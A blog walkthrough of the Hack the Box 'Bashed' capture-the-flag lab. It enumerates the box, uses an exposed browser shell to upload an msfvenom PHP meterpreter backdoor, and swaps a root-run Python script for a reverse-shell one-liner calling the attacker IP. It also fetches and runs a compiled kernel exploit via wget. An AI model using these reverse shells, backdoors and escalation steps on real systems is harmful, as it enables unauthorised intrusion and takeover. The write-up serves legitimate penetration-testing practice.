@@ -1,0 +1,447 @@
+
+								
+																		Hack the Box Challenge Bashed Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 30, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello Friends!! Today we are going to solve a CTF Challenge “Bashed”. It is a lab that is developed by Hack the Box. They have an amazing collection of Online Labs, on which you can practice your penetration testing skills. They have labs which are designed for beginners to the expert penetration testers. Bashed is a Retired Lab.
+Level: Medium
+Task: Find the user.txt and root.txt in the vulnerable Lab.
+Let’s Begin!
+As these labs are only available online, therefore, they have a static IP. Bashed Lab has IP: 10.10.10.68.
+Now, as always let’s begin our hacking with the port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.68
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.68
+					
+				
+			
+		
+
+
+Knowing port 80 is open on the victim’s network we preferred to explore his IP in the browser and the following image opened as shown below.
+
+Next, we use the dirb tool of kali to enumerate the directories and found some important directories such as /dev 
+
+So when you will open /dev directory in the browser, you will get a link for phpbash.php. Click on that link.
+
+It will redirect to the following page as shown below, which seems like a shell interacting through the browser.
+After that, you can execute any os arbitrary command for testing whether it’s working or not. We have run ls command to check the present list in the current directory.
+
+Inside /html directory we found uploads folder and hence now we can easily compromise the target’s system by uploading backdoor.
+
+Using msfvenom we had created a malicious shell.php file by executing following command.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.28 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.28 lport=4444 -f raw
+					
+				
+			
+		
+
+Simultaneously run multi/handler for reverse connection of the victim’s system.
+
+We had used Python HTTP server for transferring file, you can also use an alternative method for transferring and download the malicious file from wget inside uploads directory.
+
+Now execute the malicious file shell.php from the browser as shown below and move to Metasploit framework for reverse connection.
+
+After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.28
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.28msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session1 opened for accessing victim tty shell.
+Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+			
+				
+					
+				
+					12
+				
+						cd /homels
+					
+				
+			
+		
+
+Here one directories arrexel, when I explore /home/arrexel I saw user.txt and use cat command for reading.
+
+		
+		
+			
+			
+			
+			
+cd arrexel
+ls
+cat user.txt
+			
+				
+					
+				
+					123
+				
+						cd arrexellscat user.txt
+					
+				
+			
+		
+
+Great!!  Here we had completed 1st task now move to 2nd task
+
+For spawning proper tty shell of target’s system we need to import python file, therefore, I run following command inside the meterpreter shell
+
+		
+		
+			
+			
+			
+			
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+lsb_release -a
+			
+				
+					
+				
+					123
+				
+						shellpython -c 'import pty;pty.spawn("/bin/bash")'lsb_release -a
+					
+				
+			
+		
+
+
+Run ls -al command to observe all directories with their permissions. Here you will notice the user scriptmanager has permission for accessing /scripts directory.
+
+When we tried to open /scripts directory as the default user, it showed Permission Denied message. Then run sudo -l command which will tell us that the scriptmanager has No password for all the things.
+Then we run the following command for penetrating scripts folder with help of scriptmanager
+
+		
+		
+			
+			
+			
+			
+sudo -u scriptmanager ls /scripts
+sudo -u scriptmanager cat /scripts/test.py
+sudo -u scriptmanager cat /scripts/test.txt
+			
+				
+					
+				
+					123
+				
+						sudo -u scriptmanager ls /scriptssudo -u scriptmanager cat /scripts/test.pysudo -u scriptmanager cat /scripts/test.txt
+					
+				
+			
+		
+
+Since we found a python file, therefore, our strategy will be to replace the original test.py file from malicious python file to have a reverse connection over netcat and for that, you need to save following code in a text file. 
+
+		
+		
+			
+			
+			
+			
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+			
+				
+					
+				
+					1
+				
+						import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+					
+				
+			
+		
+
+Save this file with .py extension and transfer it into the victim’s system and start netcat on listening port.
+ Note: Replace 10.10.14.28 from inside the code into your VPN IP.
+
+Now download malicious python file inside /tmp
+
+		
+		
+			
+			
+			
+			
+wget http://10.10.14.28/root.py
+			
+				
+					
+				
+					1
+				
+						wget http://10.10.14.28/root.py
+					
+				
+			
+		
+
+And then copy the root.py from inside /tmp into test.py in /script with the help of the following command.
+
+		
+		
+			
+			
+			
+			
+sudo -u scriptmanager cp /tmp/root.py /scripts/test.py
+			
+				
+					
+				
+					1
+				
+						sudo -u scriptmanager cp /tmp/root.py /scripts/test.py
+					
+				
+			
+		
+
+
+After some time you will get reverse to connect at netcat terminal with root access. Now finish the task by capturing the root.txt file as shown below.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+id
+cd /root&lt;span style="vertical-align: inherit;"&gt;&lt;span style="vertical-align: inherit;"&gt;
+ls&lt;/span&gt;&lt;/span&gt;
+cat root.txt
+			
+				
+					
+				
+					12345
+				
+						nc -lvp 1234idcd /root&lt;span style="vertical-align: inherit;"&gt;&lt;span style="vertical-align: inherit;"&gt;ls&lt;/span&gt;&lt;/span&gt;cat root.txt
+					
+				
+			
+		
+
+
+2nd Method for finding the root.txt flag.
+We have found machine architecture 14.0 in the above method. So we start looking for a related kernel exploit in Google and luckily found an exploit from here for root privilege escalation. 
+Copy and paste the whole text inside a text file and save as poc.c
+
+After that compile it with help of the following command:
+
+		
+		
+			
+			
+			
+			
+gcc poc.c -o pwn
+			
+				
+					
+				
+					1
+				
+						gcc poc.c -o pwn
+					
+				
+			
+		
+
+Run python HTTP server for transferring it into targets system.
+
+At last, download complied file pwn into the target machine from wget inside /dev/shm as shown in the image then give full permission and run the file.
+
+		
+		
+			
+			
+			
+			
+wget http://10.10.14.28/pwn
+chmod 777 pwn
+./pwn
+			
+				
+					
+				
+					123
+				
+						wget http://10.10.14.28/pwnchmod 777 pwn./pwn
+					
+				
+			
+		
+
+It will give you root access, now catch the root.txt flag as soon as possible because it will crash the kernel after some time.
+
+		
+		
+			
+			
+			
+			
+cd /root
+cat root.txt
+			
+				
+					
+				
+					12
+				
+						cd /rootcat root.txt
+					
+				
+			
+		
+
+Superb!! We had completed the task and hacked this box.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
